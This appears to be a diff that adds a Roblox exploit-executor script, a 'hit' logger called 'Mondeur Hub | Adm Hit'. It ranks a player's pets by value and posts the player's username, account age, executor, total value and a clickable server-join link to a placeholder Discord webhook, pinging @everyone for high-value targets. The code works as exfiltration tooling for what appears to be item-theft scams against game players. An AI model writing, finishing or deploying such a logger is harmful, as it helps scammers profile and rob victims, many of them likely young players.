@@ -1,0 +1,126 @@
+--// MONDEUR HUB | ADM HIT 🦊 (CLEAN CORE)
+
+local HttpService = game:GetService("HttpService")
+
+local webhook = "YOUR_WEBHOOK_HERE"
+local threshold = 500 -- change anytime
+
+-- =========================
+-- 🧠 SAMPLE DATA INPUT (REPLACE WITH YOUR OWN SOURCE)
+-- =========================
+local pets = {
+    {name = "Metal Ox", value = 500},
+    {name = "Dog", value = 5},
+    {name = "Metal Ox", value = 500},
+    {name = "Cat", value = 2}
+}
+
+local playerData = {
+    displayName = "Chafya",
+    username = "cfpaj67",
+    accountAge = 2056,
+    executor = "Delta",
+    players = "24/35"
+}
+
+-- =========================
+-- 📦 STACK + SORT
+-- =========================
+local map = {}
+
+for _, pet in ipairs(pets) do
+    if not map[pet.name] then
+        map[pet.name] = {
+            name = pet.name,
+            count = 0,
+            value = pet.value
+        }
+    end
+    map[pet.name].count += 1
+end
+
+local list = {}
+local totalValue = 0
+
+for _, p in pairs(map) do
+    totalValue += p.value * p.count
+    table.insert(list, p)
+end
+
+table.sort(list, function(a, b)
+    return a.value > b.value
+end)
+
+-- =========================
+-- 📋 FORMAT
+-- =========================
+local function formatPets(list)
+    local lines = {}
+
+    for i, p in ipairs(list) do
+        if i > 12 then break end
+        table.insert(lines, string.format("%s x%d", p.name, p.count))
+    end
+
+    return #lines > 0 and table.concat(lines, "\n") or "No pets"
+end
+
+local petList = formatPets(list)
+
+-- =========================
+-- 🔗 JOIN BUTTON (CLICKABLE)
+-- =========================
+local joinLink = "https://www.roblox.com/games/PLACEID?gameInstanceId=JOBID"
+
+-- =========================
+-- 🚨 THRESHOLD
+-- =========================
+local content = ""
+if totalValue >= threshold then
+    content = "@everyone"
+end
+
+-- =========================
+-- 📡 WEBHOOK
+-- =========================
+local data = {
+    ["content"] = content,
+
+    ["embeds"] = {{
+        ["title"] = "🦊 Mondeur Hub | Adm Hit",
+
+        ["description"] =
+            "```" ..
+            "👤 Display Name : " .. playerData.displayName .. "\n" ..
+            "🆔 Username     : " .. playerData.username .. "\n" ..
+            "📅 Account Age  : " .. playerData.accountAge .. " days\n" ..
+            "📱 Executor     : " .. playerData.executor .. "\n" ..
+            "👥 Players      : " .. playerData.players .. "\n" ..
+            "💰 Total Value  : " .. totalValue ..
+            "```",
+
+        ["fields"] = {
+            {
+                ["name"] = "🐶 Pets (Best → Worst)",
+                ["value"] = "```" .. petList .. "```"
+            },
+            {
+                ["name"] = "🌐 Join Server",
+                ["value"] = "[Click to Join](" .. joinLink .. ")"
+            }
+        },
+
+        ["color"] = 0x2F3136,
+        ["footer"] = {["text"] = "Mondeuronbotton"}
+    }}
+}
+
+-- =========================
+-- 🚀 SEND
+-- =========================
+request({
+    Url = webhook,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
